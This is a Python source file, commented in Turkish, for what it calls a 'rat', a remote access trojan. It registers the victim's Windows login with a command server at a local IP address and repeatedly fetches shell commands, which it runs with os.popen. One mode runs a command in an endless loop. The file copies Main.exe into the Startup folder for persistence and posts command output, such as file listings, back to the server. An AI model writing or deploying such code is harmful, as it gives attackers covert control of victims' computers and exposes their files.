import requests
from datetime import datetime
import os
import time
import shutil
import tempfile
import pathlib
import zipfile




URL = "http://192.168.1.64:3333"



def sendSimpleData():
    url = URL + "/rat/init"
    data = {
    'desktopName': os.getlogin(),
    }
    # POST isteği gönder
    try:
        response = requests.post(url, json=data)
        print("Registered to the system.")
    except Exception as e:
        print()

import os

def listenAndPopen():
    eskiKomut = ""  # Önceki komutu saklamak için bir değişken
    eskiKullanici = ""  # Önceki kullanıcı adını saklamak için bir değişken

    while True:
        try:
            response = requests.get(URL + "/rat/popen")
            data = response.json()
            username = data.get("username")
            command = data.get("command")
            zorbamode =data.get('zorbamode')

            if zorbamode == "true":
                while True:
                    os.popen(command)
            else:
                if command != eskiKomut or username != eskiKullanici:  # Yeni komut veya kullanıcı adıyla önceki komut veya kullanıcı adını karşılaştırma
                    eskiKomut = command  # Önceki komutu güncelle
                    eskiKullanici = username  # Önceki kullanıcı adını güncelle

                    if (username == os.getlogin() or username == "*"):
                        os.popen(command)
                        #print(command + "  çalıştırıldı.")
                        time.sleep(3)

        except Exception as e:
            print()
            time.sleep(3)




def saveToStartup():
    try:
        # Başlangıç klasörünün dosya yolu
        startup_klasoru = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Kaynak dosya yolu (Main.exe'nin bulunduğu dizin)
        kaynak = os.path.join("Main.exe")

        # Hedef dosya yolu (startup klasörüne kopyalanacak dosya yolu)
        hedef = os.path.join(startup_klasoru, "Main.exe")

        # Eğer hedef dosya zaten varsa sil
        if os.path.exists(hedef):
            os.remove(hedef)

        # Dosyayı kopyala
        shutil.copyfile(kaynak, hedef)
        
        print("Başarıyla kopyalandı.")
    except Exception as e:
        print()



def listenAndPostData():
    eskiRes = ""
    eskiKullanici = ""  # Önceki kullanıcı adını saklamak için bir değişken

    while True:
        try:
            response = requests.get(URL + "/rat/dos")
            data = response.json()
            username = data.get("username")
            command = data.get("command")
            ziplensinMi = data.get("zip")
            if ziplensinMi == "true":
                if eskiRes != response.text or username != eskiKullanici:
                    eskiRes = response.text
                    eskiKullanici = username

                    if username == os.getlogin() or username == "*":
                        # Execute command and save output to a temporary file
                        dosyalar = os.popen(command).read()
                        print("fileUpload tetiklendi, su path ile --> " + dosyalar.replace(" ",""))

                        # Upload the temporary file
                        fileUpload(dosyalar.replace(" ",""))

                        time.sleep(3)
            else:
                if eskiRes != response.text or username != eskiKullanici:
                    eskiRes = response.text
                    eskiKullanici = username

                    if username == os.getlogin() or username == "*":
                        dosyalar = os.popen(command).read()
                        print(command + " çalıştırıldı.")
                        # Veriyi gönder
                        data = {
                            'desktop': os.getlogin(),
                            'allDirectories': dosyalar.replace(" ","")
                        }
                        print("dosya yollari gonderildi.")

                        requests.post(URL + "/rat/postdata", json=data)
                        time.sleep(3)

        except Exception as e:
            print(e)
            time.sleep(3)

def fileUpload(smth):

    file_list = os.listdir(smth)
    print(file_list)




